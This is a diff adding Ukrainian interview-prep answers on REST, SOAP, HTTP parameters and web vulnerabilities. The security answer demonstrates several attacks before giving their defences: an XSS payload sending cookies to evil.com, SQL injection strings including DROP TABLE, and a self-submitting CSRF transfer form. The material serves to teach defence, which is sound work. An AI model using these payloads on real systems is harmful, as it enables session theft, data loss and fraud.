@@ -42,6 +42,30 @@
 
 17. [Як коректно визначити реальний IP користувача в застосунку, якщо запит проходить через Nginx, reverse proxy або load balancer? Поясніть X-Forwarded-For, X-Real-IP, trusted proxies.](#17)
 
+## Блок 5. API та архітектура
+
+18. [Що таке REST і які основні принципи RESTful API? Поясніть ресурси, URI, statelessness, idempotency, HTTP methods та коди відповідей.](#18)
+
+19. [Чи обов'язково REST API має працювати тільки з JSON, чи можливий XML? Поясніть роль Content-Type і Accept.](#19)
+
+20. [У чому різниця між SOAP і REST, і де кожен підхід може бути виправданим?](#20)
+
+21. [У яких HTTP-методах можуть передаватися query params і request body, і як це правильно використовувати при проектуванні API? Поясніть query params, path params і body для GET, POST, PUT, PATCH, DELETE.](#21)
+
+## Блок 6. Безпека
+
+22. [Поясніть основні типи веб-вразливостей: XSS, SQL Injection, CSRF, Broken Authentication. Для кожної: що це таке, як виникає, які наслідки та як правильно захищатися.](#22)
+
+## Блок 7. Docker, cron, backend operation
+
+23. [Що таке Docker volume, чим він відрізняється від bind mount, і коли який підхід краще використовувати?](#23)
+
+24. [Як реалізувати виконання задачі частіше, ніж раз на хвилину, якщо стандартний cron має обмеження в 1 хвилину? Які є альтернативні підходи в production-середовищі?](#24)
+
+25. [Як би ви проектували систему для обробки різкого напливу однотипних запитів, щоб зменшити навантаження на бекенд і базу даних? Розкажіть про кешування, rate limiting, черги, дедуплікацію, блокування, cache stampede та масштабування.](#25)
+
+## Блок 8. Senior / Highload / System Design
+
 ---
 
 <a id="1"></a>
@@ -2754,5 +2778,1718 @@ framework:
 - **Trusted proxies** — читати XFF справа, пропускати відомі proxy IP
 - **Symfony** — `setTrustedProxies()` або `trusted_proxies` у конфігу
 - **Ніколи** не довіряти XFF без перевірки trusted proxies — ризик IP spoofing
+
+</details>
+
+---
+
+<a id="18"></a>
+
+### 18. Що таке REST і які основні принципи RESTful API? Поясніть ресурси, URI, statelessness, idempotency, HTTP methods та коди відповідей.
+
+<details>
+<summary>Розкрити:</summary>
+
+#### Загальна відповідь
+
+REST (Representational State Transfer) — це архітектурний стиль побудови API, описаний Роєм Філдінгом у 2000 році. REST не є протоколом чи стандартом — це набір принципів, яким має відповідати API щоб вважатись RESTful. Система будується навколо ресурсів, доступних через URI, а взаємодія з ними відбувається через стандартні HTTP methods зі зрозумілою семантикою.
+
+---
+
+#### 6 принципів REST
+
+**1. Client-Server**
+Клієнт і сервер розділені. Клієнт відповідає за UI, сервер — за дані і логіку. Вони взаємодіють тільки через API, що дозволяє розвивати їх незалежно.
+
+**2. Stateless**
+Кожен запит містить всю необхідну інформацію для обробки. Сервер не зберігає стан між запитами. Якщо потрібна авторизація — токен передається з кожним запитом, а не зберігається в сесії на сервері.
+
+```
+# Правильно — stateless
+GET /orders/42
+Authorization: Bearer eyJhbGc...
+
+# Неправильно — сервер знає "поточного користувача" з сесії
+GET /my-orders
+Cookie: PHPSESSID=abc123
+```
+
+**3. Cacheable**
+Відповіді мають явно вказувати чи можна їх кешувати. Це покращує масштабованість і продуктивність.
+
+**4. Uniform Interface**
+Єдиний інтерфейс взаємодії через ресурси, URI, HTTP methods і representations. Це і є суть REST.
+
+**5. Layered System**
+Між клієнтом і сервером можуть бути проміжні шари: load balancer, CDN, proxy, API gateway. Клієнт не знає з чим саме він спілкується.
+
+**6. Code on Demand (опціонально)**
+Сервер може передавати клієнту виконуваний код (JavaScript). Єдиний необов'язковий принцип.
+
+---
+
+#### Ресурси і URI
+
+Головна ідея REST: API будується навколо **ресурсів**, а не дій.
+
+```
+# Погано — RPC-стиль, дії в URI
+POST /createUser
+POST /deleteUser?id=42
+GET  /getUserById?id=42
+
+# Добре — REST-стиль, ресурси в URI
+POST   /users
+DELETE /users/42
+GET    /users/42
+```
+
+**Правила іменування URI:**
+- іменники, не дієслова: `/users`, `/orders`, `/products`
+- множина для колекцій: `/users`, `/orders`
+- ієрархія для вкладених ресурсів: `/users/42/orders`
+- нижнє підкреслення або дефіс для складних слів: `/order-items`
+- малі літери: `/users`, не `/Users`
+
+---
+
+#### HTTP methods і їх семантика
+
+| Method | Дія | Idempotent | Safe |
+|--------|-----|-----------|------|
+| `GET` | Отримати ресурс | ✓ | ✓ |
+| `POST` | Створити ресурс | ✗ | ✗ |
+| `PUT` | Замінити ресурс повністю | ✓ | ✗ |
+| `PATCH` | Оновити частково | ✗* | ✗ |
+| `DELETE` | Видалити ресурс | ✓ | ✗ |
+| `HEAD` | Як GET, але без body | ✓ | ✓ |
+| `OPTIONS` | Які methods підтримуються | ✓ | ✓ |
+
+*PATCH може бути idempotent залежно від реалізації.
+
+---
+
+#### Idempotency — важлива концепція
+
+**Idempotent** — повторний виклик дає той самий результат що й перший.
+
+```
+# GET — idempotent: скільки разів не виклич — той самий результат
+GET /users/42  →  завжди повертає user 42
+
+# DELETE — idempotent: перший видаляє, наступні повертають 404, але стан не змінюється
+DELETE /users/42  →  200 або 204
+DELETE /users/42  →  404 (вже видалений)
+
+# PUT — idempotent: багаторазове оновлення дає той самий стан
+PUT /users/42  { "name": "John" }  →  завжди user 42 з name=John
+
+# POST — НЕ idempotent: кожен виклик створює новий ресурс
+POST /users  { "name": "John" }  →  user 1, user 2, user 3...
+```
+
+Idempotency важлива для retry-логіки: якщо запит загубився — можна безпечно повторити тільки idempotent methods.
+
+---
+
+#### Safe methods
+
+**Safe** — метод не змінює стан ресурсу на сервері. `GET`, `HEAD`, `OPTIONS` — safe. Браузери і CDN можуть кешувати safe requests без побоювань.
+
+---
+
+#### HTTP status codes у REST
+
+**2xx — успіх:**
+```
+200 OK           — GET, PUT, PATCH успішні
+201 Created      — POST створив ресурс (+ Location header з URI)
+204 No Content   — DELETE або PUT без body у відповіді
+```
+
+**3xx — редіректи:**
+```
+301 Moved Permanently  — ресурс переїхав назавжди
+304 Not Modified       — кеш актуальний
+```
+
+**4xx — помилка клієнта:**
+```
+400 Bad Request        — невалідні дані в запиті
+401 Unauthorized       — не авторизований (немає/невалідний токен)
+403 Forbidden          — авторизований, але немає прав
+404 Not Found          — ресурс не існує
+405 Method Not Allowed — метод не підтримується
+409 Conflict           — конфлікт (наприклад, дублікат)
+422 Unprocessable      — синтаксично правильно, але семантично невалідно
+429 Too Many Requests  — rate limiting
+```
+
+**5xx — помилка сервера:**
+```
+500 Internal Server Error  — щось зламалось на сервері
+502 Bad Gateway            — проксі отримав невалідну відповідь від backend
+503 Service Unavailable    — сервер недоступний (overload, maintenance)
+```
+
+---
+
+#### PUT vs PATCH
+
+```
+# PUT — замінює ресурс повністю
+PUT /users/42
+{ "name": "John", "email": "john@example.com", "role": "admin" }
+# Якщо не передати role — він буде видалений або скинутий до дефолту
+
+# PATCH — оновлює тільки передані поля
+PATCH /users/42
+{ "name": "John" }
+# email і role залишаються незмінними
+```
+
+---
+
+#### Типова структура RESTful API
+
+```
+GET    /users              — список користувачів
+POST   /users              — створити користувача
+GET    /users/42           — отримати користувача
+PUT    /users/42           — замінити користувача повністю
+PATCH  /users/42           — оновити частково
+DELETE /users/42           — видалити
+
+GET    /users/42/orders    — замовлення конкретного користувача
+POST   /users/42/orders    — створити замовлення для користувача
+GET    /users/42/orders/7  — конкретне замовлення
+```
+
+---
+
+#### REST vs не REST
+
+```
+# Не REST — дії в URI
+POST /api/users/42/activate
+POST /api/users/42/sendWelcomeEmail
+
+# REST-підхід — через ресурс або sub-resource
+PATCH /users/42  { "status": "active" }
+POST  /users/42/welcome-email
+```
+
+Другий варіант спірний — деякі дії (відправити email, запустити процес) важко виразити через ресурс. У таких випадках допустимо відступати від чистого REST.
+
+---
+
+#### Міні-шпаргалка
+
+- **REST** — архітектурний стиль, не протокол
+- **Ресурси в URI** — іменники, не дієслова: `/users/42`, не `/getUser`
+- **Stateless** — кожен запит самодостатній, сервер не зберігає сесію
+- **GET** — safe і idempotent; **POST** — не idempotent; **PUT/DELETE** — idempotent
+- **PUT** — замінює повністю; **PATCH** — оновлює частково
+- **201** — створено; **204** — без тіла; **401** — немає auth; **403** — немає прав; **422** — невалідні дані
+
+</details>
+
+---
+
+<a id="19"></a>
+
+### 19. Чи обов'язково REST API має працювати тільки з JSON, чи можливий XML? Поясніть роль Content-Type і Accept.
+
+<details>
+<summary>Розкрити:</summary>
+
+#### Загальна відповідь
+
+REST — це архітектурний стиль, а не формат даних. REST нічого не говорить про те, у якому форматі передавати дані. API може повертати JSON, XML, HTML, CSV, бінарні дані або будь-який інший формат. JSON став де-факто стандартом для сучасних REST API через простоту і зручність у роботі з JavaScript, але технічно REST і JSON — незалежні речі.
+
+Формат погоджується між клієнтом і сервером через два headers: `Content-Type` (що відправляємо) і `Accept` (що хочемо отримати).
+
+---
+
+#### Content-Type
+
+Вказує формат тіла запиту або відповіді.
+
+**У request** — клієнт каже серверу в якому форматі передає дані:
+```
+POST /api/users
+Content-Type: application/json
+
+{ "name": "John", "email": "john@example.com" }
+```
+
+```
+POST /api/users
+Content-Type: application/xml
+
+<user><name>John</name><email>john@example.com</email></user>
+```
+
+**У response** — сервер каже клієнту в якому форматі повертає дані:
+```
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=UTF-8
+
+{ "id": 42, "name": "John" }
+```
+
+---
+
+#### Accept
+
+Клієнт вказує який формат відповіді він очікує:
+
+```
+GET /api/users/42
+Accept: application/json
+```
+
+```
+GET /api/users/42
+Accept: application/xml
+```
+
+Сервер дивиться на `Accept` і повертає відповідь у потрібному форматі — якщо підтримує. Якщо не підтримує — повертає `406 Not Acceptable`.
+
+**Пріоритети через q-factor:**
+```
+Accept: application/json, application/xml;q=0.9, */*;q=0.8
+```
+`q` — вага від 0 до 1. Клієнт каже: хочу JSON (q=1.0 дефолт), якщо немає — XML (q=0.9), якщо і його немає — будь-що (q=0.8).
+
+---
+
+#### Content-Type у різних сценаріях
+
+| Формат | Content-Type |
+|--------|-------------|
+| JSON | `application/json` |
+| XML | `application/xml` або `text/xml` |
+| HTML | `text/html` |
+| Plain text | `text/plain` |
+| Form data | `application/x-www-form-urlencoded` |
+| Multipart (файли) | `multipart/form-data` |
+| PDF | `application/pdf` |
+| Бінарний файл | `application/octet-stream` |
+| CSV | `text/csv` |
+
+---
+
+#### Content Negotiation
+
+Механізм узгодження формату між клієнтом і сервером називається **content negotiation**. Клієнт через `Accept` пропонує що він хоче, сервер вибирає з підтримуваних форматів і відповідає `Content-Type`.
+
+```
+# Клієнт
+GET /api/report/42
+Accept: text/csv, application/json;q=0.5
+
+# Сервер підтримує CSV → повертає CSV
+HTTP/1.1 200 OK
+Content-Type: text/csv
+
+id,name,amount
+1,Order 1,100.00
+```
+
+---
+
+#### Чому XML використовується рідше у REST
+
+- JSON коротший і читабельніший
+- JSON нативно парситься в JavaScript (`JSON.parse`)
+- JSON менший за обсягом — менше трафіку
+- XML надмірно багатослівний для простих структур
+
+XML залишається актуальним у:
+- legacy enterprise системах (SAP, банківські інтеграції)
+- SOAP API (де XML обов'язковий)
+- галузевих стандартах (HL7 у медицині, FIXML у фінансах)
+- RSS/Atom feeds
+- конфіг файлах (Maven, Android layouts)
+
+---
+
+#### Практика у PHP / Symfony
+
+```php
+// Symfony — автоматичне серіалізування залежно від Accept
+// з використанням FOSRestBundle або Symfony Serializer
+
+$data = ['id' => 42, 'name' => 'John'];
+
+// Якщо Accept: application/json
+return $this->json($data); // Content-Type: application/json
+
+// Якщо потрібна підтримка XML
+// Symfony Serializer підтримує обидва формати через encoder
+$format = $request->getPreferredFormat('json'); // json або xml
+$serialized = $serializer->serialize($data, $format);
+
+return new Response(
+    $serialized,
+    200,
+    ['Content-Type' => $request->getMimeType($format)]
+);
+```
+
+---
+
+#### Що буде якщо Content-Type не вказаний
+
+- Без `Content-Type` у request сервер може не зрозуміти як парсити body
+- Деякі фреймворки дефолтно очікують `application/x-www-form-urlencoded`
+- Symfony і Laravel при відсутності `Content-Type: application/json` не розпарсять JSON body автоматично
+
+---
+
+#### Міні-шпаргалка
+
+- **REST** не прив'язаний до JSON — це архітектурний стиль
+- **Content-Type** — формат того що відправляємо в body
+- **Accept** — формат того що хочемо отримати у відповіді
+- **406 Not Acceptable** — сервер не підтримує запитаний формат
+- **Content Negotiation** — механізм узгодження формату
+- **JSON** — де-факто стандарт для сучасних REST API
+- **XML** — актуальний у legacy, SOAP, enterprise інтеграціях
+
+</details>
+
+---
+
+<a id="20"></a>
+
+### 20. У чому різниця між SOAP і REST, і де кожен підхід може бути виправданим?
+
+<details>
+<summary>Розкрити:</summary>
+
+#### Загальна відповідь
+
+SOAP і REST — два принципово різні підходи до побудови API. REST — архітектурний стиль без жорстких вимог до формату. SOAP — протокол із суворим стандартом: XML-конверт, WSDL-контракт, чіткі правила обробки помилок. REST гнучкіший і легший, SOAP — формальніший і надійніший у контексті enterprise-інтеграцій.
+
+На практиці вибір між ними рідко залежить від переваг — частіше від існуючої інфраструктури, вимог партнерів або галузевих стандартів.
+
+---
+
+#### SOAP — що це таке
+
+SOAP (Simple Object Access Protocol) — протокол обміну повідомленнями на основі XML. Кожне повідомлення має чітку структуру — **SOAP Envelope**:
+
+```xml
+POST /PaymentService HTTP/1.1
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "urn:ProcessPayment"
+
+<?xml version="1.0"?>
+<soap:Envelope
+  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+  <soap:Header>
+    <auth:Token xmlns:auth="urn:auth">Bearer abc123</auth:Token>
+  </soap:Header>
+
+  <soap:Body>
+    <pay:ProcessPayment xmlns:pay="urn:payment">
+      <pay:Amount>100.00</pay:Amount>
+      <pay:Currency>USD</pay:Currency>
+      <pay:CardToken>tok_xyz</pay:CardToken>
+    </pay:ProcessPayment>
+  </soap:Body>
+
+</soap:Envelope>
+```
+
+---
+
+#### WSDL — контракт SOAP API
+
+WSDL (Web Services Description Language) — XML-документ, який повністю описує SOAP API: які операції є, які типи даних, які endpoints. Це машиночитаний контракт — по ньому можна автоматично генерувати клієнтський код.
+
+```
+# Отримати WSDL
+GET https://api.example.com/PaymentService?wsdl
+```
+
+---
+
+#### Порівняння REST і SOAP
+
+| | REST | SOAP |
+|---|---|---|
+| Тип | Архітектурний стиль | Протокол |
+| Формат | JSON, XML, будь-який | Тільки XML |
+| Транспорт | HTTP | HTTP, SMTP, TCP та інші |
+| Контракт | Немає стандарту (OpenAPI опціонально) | WSDL (обов'язковий) |
+| Стан | Stateless | Може бути stateful |
+| Обробка помилок | HTTP status codes | SOAP Fault у body |
+| Безпека | HTTPS, JWT, OAuth | WS-Security (у header) |
+| Складність | Простіше | Складніше, більше overhead |
+| Типізація | Слабка (залежить від реалізації) | Строга через XSD |
+| Кешування | Підтримується (GET) | Складніше (все POST) |
+
+---
+
+#### SOAP Fault — обробка помилок
+
+У SOAP помилки повертаються не через HTTP status codes, а через `<soap:Fault>` у body — завжди зі статусом `500`:
+
+```xml
+<soap:Envelope>
+  <soap:Body>
+    <soap:Fault>
+      <faultcode>soap:Client</faultcode>
+      <faultstring>Invalid card token</faultstring>
+      <detail>
+        <err:ErrorCode>INVALID_TOKEN</err:ErrorCode>
+      </detail>
+    </soap:Fault>
+  </soap:Body>
+</soap:Envelope>
+```
+
+---
+
+#### Де SOAP виправданий
+
+**Фінансові та банківські системи** — SOAP з WS-Security забезпечує суворіші гарантії безпеки, підписування повідомлень, non-repudiation (неможливість відмовитись від факту відправки).
+
+**Корпоративні інтеграції (ERP, SAP, 1C)** — ці системи десятиліттями використовують SOAP і WSDL. Змінити їх дорого.
+
+**Телекомунікації** — багато стандартів (наприклад TM Forum) побудовані на SOAP.
+
+**Медицина** — частина HL7 стандартів використовує SOAP.
+
+**Коли потрібна строга типізація** — WSDL + XSD дають чіткий контракт із валідацією типів, що важливо для mission-critical систем.
+
+**Коли потрібен не тільки HTTP** — SOAP може працювати поверх SMTP, TCP, MQ — корисно для асинхронних інтеграцій.
+
+---
+
+#### Де REST виправданий
+
+- Публічні та мобільні API
+- Мікросервісна архітектура
+- Прості CRUD-операції
+- Коли важлива швидкість розробки
+- Коли клієнти — браузери або мобільні додатки
+
+---
+
+#### WS-Security vs HTTPS/JWT
+
+SOAP має власний стандарт безпеки — **WS-Security**, який дозволяє підписувати і шифрувати окремі частини повідомлення на рівні XML. Це корисно коли повідомлення проходить через кілька посередників і кожен повинен бачити тільки свою частину.
+
+REST покладається на безпеку транспортного рівня (HTTPS) і application-level auth (JWT, OAuth). Якщо потрібне end-to-end шифрування через посередників — REST вимагає додаткових рішень.
+
+---
+
+#### Практика — SOAP клієнт у PHP
+
+```php
+// Вбудований SoapClient
+$client = new SoapClient('https://api.bank.com/PaymentService?wsdl', [
+    'trace'      => true,
+    'exceptions' => true,
+]);
+
+try {
+    $result = $client->ProcessPayment([
+        'Amount'    => 100.00,
+        'Currency'  => 'USD',
+        'CardToken' => 'tok_xyz',
+    ]);
+} catch (SoapFault $e) {
+    echo $e->getMessage();
+}
+```
+
+---
+
+#### Міні-шпаргалка
+
+- **REST** — стиль, гнучкий, JSON, HTTP, простий
+- **SOAP** — протокол, суворий, XML, WSDL, WS-Security
+- **SOAP виправданий** — банки, enterprise, legacy, строга типізація, non-HTTP транспорт
+- **REST виправданий** — більшість сучасних API, мобільні клієнти, мікросервіси
+- **Головна відмінність** — SOAP має обов'язковий контракт (WSDL) і власний стандарт безпеки; REST — без жорстких вимог
+- **На практиці** — часто вибір диктує партнер або legacy система, не особисті переваги
+
+</details>
+
+---
+
+<a id="21"></a>
+
+### 21. У яких HTTP-методах можуть передаватися query params і request body, і як це правильно використовувати при проектуванні API? Поясніть query params, path params і body для GET, POST, PUT, PATCH, DELETE.
+
+<details>
+<summary>Розкрити:</summary>
+
+#### Загальна відповідь
+
+В HTTP є три основні місця для передачі даних: **path params** (частина URI), **query params** (після `?`) і **request body**. Технічно body можна передати з будь-яким методом, але за семантикою і конвенціями кожен метод має своє призначення. GET з body — технічно можливий, але не рекомендований і погано підтримується проксі та бібліотеками.
+
+---
+
+#### Три місця для даних
+
+```
+GET /users/42?include=orders&lang=uk
+     ↑         ↑
+  path param   query params
+```
+
+```
+POST /users
+Content-Type: application/json
+
+{ "name": "John", "email": "john@example.com" }
+↑
+request body
+```
+
+---
+
+#### Path params
+
+Ідентифікують конкретний ресурс або підресурс. Є частиною URI.
+
+```
+/users/42           → конкретний user
+/users/42/orders    → замовлення конкретного user
+/orders/7/items/3   → конкретний item конкретного замовлення
+```
+
+**Коли використовувати:** коли дані ідентифікують ресурс — ID, slug, унікальний ідентифікатор.
+
+---
+
+#### Query params
+
+Передаються після `?` у вигляді `key=value&key2=value2`. Не змінюють ресурс — уточнюють як його повернути.
+
+```
+GET /users?page=2&per_page=20&sort=name&order=asc
+GET /products?category=electronics&min_price=100&max_price=500
+GET /orders?status=pending&created_after=2024-01-01
+GET /users/42?include=orders,profile
+```
+
+**Коли використовувати:**
+- фільтрація, сортування, пагінація
+- додаткові параметри вибірки (`include`, `fields`)
+- пошук (`q=keyword`)
+- формат відповіді (`format=csv`)
+
+Query params — частина URL, тому вони логуються, кешуються, видні в браузері. Не передавати через них паролі або токени.
+
+---
+
+#### Request body
+
+Передає структуровані дані для створення або оновлення ресурсу.
+
+```
+POST /users
+Content-Type: application/json
+
+{
+    "name": "John",
+    "email": "john@example.com",
+    "role": "editor"
+}
+```
+
+**Коли використовувати:** для даних які створюють або змінюють стан ресурсу — POST, PUT, PATCH. Дані не видні в URL, можуть бути будь-якого розміру і складності.
+
+---
+
+#### По кожному методу
+
+**GET — тільки path і query params, без body:**
+```
+GET /users                          # список
+GET /users?role=admin&page=1        # з фільтром
+GET /users/42                       # конкретний
+GET /users/42?include=orders        # з вкладеними даними
+```
+
+Технічно GET може мати body, але:
+- більшість проксі і CDN ігнорують або відкидають body у GET
+- багато HTTP-клієнтів не підтримують body у GET
+- семантично GET — "отримати", body не потрібен
+
+**POST — body для створення:**
+```
+POST /users
+{ "name": "John", "email": "john@example.com" }
+
+POST /orders/42/items
+{ "product_id": 5, "quantity": 2 }
+```
+
+Query params у POST можливі для додаткових опцій:
+```
+POST /users?notify=true
+{ "name": "John" }
+```
+
+**PUT — body для повної заміни:**
+```
+PUT /users/42
+{ "name": "John", "email": "new@example.com", "role": "admin" }
+```
+
+Path param — ID ресурсу. Body — нові повні дані. Якщо поле не передане — воно скидається або видаляється.
+
+**PATCH — body для часткового оновлення:**
+```
+PATCH /users/42
+{ "name": "John" }
+```
+
+Тільки передані поля оновлюються. `email` і `role` залишаються.
+
+**DELETE — зазвичай без body:**
+```
+DELETE /users/42
+```
+
+Іноді body використовують для масового видалення:
+```
+DELETE /users
+{ "ids": [1, 2, 3] }
+```
+
+Але це спірна практика — краще:
+```
+POST /users/bulk-delete
+{ "ids": [1, 2, 3] }
+```
+
+Або через query:
+```
+DELETE /users?ids=1,2,3
+```
+
+---
+
+#### Типові помилки проектування
+
+**Дані пошуку через body у GET:**
+```
+# Погано — GET з body не кешується і не логується нормально
+GET /users
+{ "filters": { "role": "admin" } }
+
+# Добре — query params
+GET /users?role=admin
+```
+
+**Фільтри в path:**
+```
+# Погано — фільтр не є частиною ідентифікатора ресурсу
+GET /users/active
+
+# Краще
+GET /users?status=active
+```
+
+**Секретні дані в query:**
+```
+# Погано — токен видний в URL, логах, history
+GET /export?token=secret123
+
+# Краще — через header
+GET /export
+Authorization: Bearer secret123
+```
+
+**ID ресурсу в body замість path:**
+```
+# Погано
+PUT /users
+{ "id": 42, "name": "John" }
+
+# Добре
+PUT /users/42
+{ "name": "John" }
+```
+
+---
+
+#### Зведена таблиця
+
+| Method | Path params | Query params | Body |
+|--------|------------|-------------|------|
+| GET | ✓ (ID ресурсу) | ✓ (фільтри, сортування) | ✗ (не рекомендовано) |
+| POST | ✓ (батьківський ресурс) | рідко | ✓ (дані нового ресурсу) |
+| PUT | ✓ (ID ресурсу) | рідко | ✓ (повні нові дані) |
+| PATCH | ✓ (ID ресурсу) | рідко | ✓ (часткові зміни) |
+| DELETE | ✓ (ID ресурсу) | для масових операцій | не рекомендовано |
+
+---
+
+#### Міні-шпаргалка
+
+- **Path params** — ідентифікатор ресурсу: `/users/42`
+- **Query params** — фільтри, сортування, пагінація, уточнення вибірки
+- **Body** — дані для створення або оновлення ресурсу
+- **GET** — без body; query params для фільтрів
+- **POST/PUT/PATCH** — body обов'язковий для даних
+- **DELETE** — зазвичай тільки path param
+- **Ніколи** не передавати токени і паролі через query params
+
+</details>
+
+---
+
+<a id="22"></a>
+
+### 22. Поясніть основні типи веб-вразливостей: XSS, SQL Injection, CSRF, Broken Authentication. Для кожної: що це таке, як виникає, які наслідки та як правильно захищатися.
+
+<details>
+<summary>Розкрити:</summary>
+
+#### Загальна відповідь
+
+Ці чотири вразливості входять до OWASP Top 10 і є найпоширенішими причинами зламів веб-застосунків. Кожна виникає через неправильну обробку вхідних даних або помилки в архітектурі аутентифікації. Розуміння їх механізму і захисту — базовий рівень для будь-якого веб-розробника.
+
+---
+
+#### XSS (Cross-Site Scripting)
+
+**Що це:** зловмисник впроваджує JavaScript-код на сторінку, який виконується у браузері жертви.
+
+**Як виникає:**
+```php
+// Вразливий код — виводить user input без екранування
+echo "Hello, " . $_GET['name'];
+
+// Атака: ?name=<script>document.location='https://evil.com/?c='+document.cookie</script>
+// Браузер виконає скрипт і відправить cookies на сервер зловмисника
+```
+
+**Типи XSS:**
+- **Reflected** — payload у запиті, одразу повертається у відповіді
+- **Stored (Persistent)** — payload зберігається в БД і показується іншим користувачам (коментарі, профіль)
+- **DOM-based** — payload обробляється JavaScript на клієнті без участі сервера
+
+**Наслідки:** крадіжка cookies/токенів, захоплення сесії, дефейс сторінки, перенаправлення, кейлогінг.
+
+**Захист:**
+```php
+// 1. Екранування виводу — завжди
+echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+
+// Twig робить це автоматично
+{{ name }}          {# автоматично екранується #}
+{{ name|raw }}      {# небезпечно — вимкнено екранування #}
+```
+
+```
+// 2. Content Security Policy (CSP) — забороняє inline scripts
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+// 3. HttpOnly на cookies — JS не зможе прочитати навіть при XSS
+Set-Cookie: session_id=abc; HttpOnly
+
+// 4. Санітизація HTML якщо потрібно дозволити розмітку — HTMLPurifier
+```
+
+---
+
+#### SQL Injection
+
+**Що це:** зловмисник впроваджує SQL-код у запит і змінює його логіку.
+
+**Як виникає:**
+```php
+// Вразливий код — підстановка user input напряму в SQL
+$id = $_GET['id'];
+$result = $db->query("SELECT * FROM users WHERE id = $id");
+
+// Атака: ?id=1 OR 1=1
+// Запит стає: SELECT * FROM users WHERE id = 1 OR 1=1
+// Повертає всіх користувачів
+
+// Ще гірше: ?id=1; DROP TABLE users; --
+```
+
+**Наслідки:** отримання чужих даних, обхід авторизації, видалення або модифікація даних, у деяких конфігураціях — виконання команд ОС.
+
+**Захист:**
+```php
+// 1. Prepared statements — основний захист
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$id]);
+
+// Або named params
+$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
+$stmt->execute(['email' => $email]);
+
+// 2. ORM (Doctrine, Eloquent) — використовують prepared statements автоматично
+$user = $em->find(User::class, $id);
+
+// 3. Whitelist для динамічних частин запиту (ORDER BY, таблиці)
+$allowedColumns = ['name', 'email', 'created_at'];
+if (!in_array($column, $allowedColumns)) {
+    throw new \InvalidArgumentException('Invalid column');
+}
+$query = "SELECT * FROM users ORDER BY $column";
+
+// 4. Принцип мінімальних привілеїв — DB user тільки SELECT/INSERT/UPDATE
+```
+
+---
+
+#### CSRF (Cross-Site Request Forgery)
+
+**Що це:** зловмисник змушує авторизованого користувача виконати небажану дію на сайті через браузер.
+
+**Як виникає:**
+```html
+<!-- Сайт зловмисника -->
+<!-- Браузер жертви автоматично відправить cookie session_id на bank.com -->
+<img src="https://bank.com/transfer?to=hacker&amount=10000">
+
+<!-- Або форма, що автоматично сабміттиться -->
+<form action="https://bank.com/transfer" method="POST" id="f">
+    <input name="to" value="hacker">
+    <input name="amount" value="10000">
+</form>
+<script>document.getElementById('f').submit();</script>
+```
+
+**Умова:** жертва авторизована на bank.com, cookie відправляється автоматично браузером.
+
+**Наслідки:** зміна email/пароля, переказ грошей, видалення даних — будь-яка дія від імені жертви.
+
+**Захист:**
+```php
+// 1. CSRF token — основний захист
+// Генерувати унікальний токен для кожної форми/сесії
+$token = bin2hex(random_bytes(32));
+$_SESSION['csrf_token'] = $token;
+
+// У формі
+<input type="hidden" name="_token" value="<?= $token ?>">
+
+// Перевірка при обробці
+if (!hash_equals($_SESSION['csrf_token'], $_POST['_token'])) {
+    throw new \Exception('CSRF token mismatch');
+}
+
+// Symfony робить це автоматично через форми і @IsCsrfTokenValid
+```
+
+```
+// 2. SameSite=Lax або Strict на cookies
+Set-Cookie: session_id=abc; SameSite=Lax
+
+// 3. Перевірка Origin/Referer header
+// 4. Double Submit Cookie патерн для SPA
+```
+
+---
+
+#### Broken Authentication
+
+**Що це:** клас вразливостей пов'язаних з неправильною реалізацією аутентифікації, управління сесіями і паролями.
+
+**Як виникає — типові помилки:**
+
+```php
+// 1. Слабке хешування паролів
+$hash = md5($password);        // катастрофа
+$hash = sha1($password);       // теж погано
+$hash = md5($password . $salt); // краще, але недостатньо
+
+// Правильно — bcrypt або argon2
+$hash = password_hash($password, PASSWORD_BCRYPT);
+$hash = password_hash($password, PASSWORD_ARGON2ID);
+
+// Перевірка
+if (password_verify($password, $hash)) { ... }
+```
+
+```php
+// 2. Немає регенерації session ID після логіну
+session_start();
+// ... перевірка credentials ...
+// НЕПРАВИЛЬНО — не регенерують ID → session fixation
+$_SESSION['user_id'] = $user->id;
+
+// ПРАВИЛЬНО
+session_regenerate_id(true);
+$_SESSION['user_id'] = $user->id;
+```
+
+```
+// 3. Немає rate limiting → brute force
+POST /login  →  нескінченна кількість спроб
+
+// Захист: обмежити кількість спроб (5-10), потім lockout або captcha
+```
+
+```
+// 4. Передбачуваний або слабкий "Remember me" token
+$token = md5($userId . time()); // передбачуваний
+
+// Правильно
+$token = bin2hex(random_bytes(32)); // криптографічно стійкий
+// Зберігати хеш токена в БД, не сам токен
+$tokenHash = hash('sha256', $token);
+```
+
+```
+// 5. Відкриті чутливі endpoints
+GET /admin/users   // без перевірки ролі
+GET /export/all    // доступно всім авторизованим
+```
+
+**Захист:**
+- `password_hash()` з `PASSWORD_BCRYPT` або `PASSWORD_ARGON2ID`
+- `session_regenerate_id(true)` після логіну
+- Rate limiting на login endpoint
+- MFA (multi-factor authentication) для чутливих операцій
+- Короткі session lifetimes і secure cookie flags
+- Перевірка ролей і дозволів на кожному endpoint
+
+---
+
+#### Порівняння
+
+| Вразливість | Вектор атаки | Захист |
+|-------------|-------------|--------|
+| XSS | User input → JS у браузері | `htmlspecialchars`, CSP, HttpOnly |
+| SQL Injection | User input → SQL запит | Prepared statements, ORM |
+| CSRF | Небажаний запит від браузера жертви | CSRF token, SameSite cookie |
+| Broken Auth | Слабкі паролі, сесії, токени | bcrypt, regenerate ID, rate limit, MFA |
+
+---
+
+#### Міні-шпаргалка
+
+- **XSS** — input виконується як JS → `htmlspecialchars`, CSP, HttpOnly
+- **SQL Injection** — input ламає SQL → prepared statements, ORM
+- **CSRF** — браузер виконує небажаний запит → CSRF token, SameSite=Lax
+- **Broken Auth** — слабка auth/session логіка → bcrypt, session_regenerate_id, rate limit
+- Всі чотири — наслідок довіри до user input або неправильної архітектури auth
+
+</details>
+
+---
+
+<a id="23"></a>
+
+### 23. Що таке Docker volume, чим він відрізняється від bind mount, і коли який підхід краще використовувати?
+
+<details>
+<summary>Розкрити:</summary>
+
+#### Загальна відповідь
+
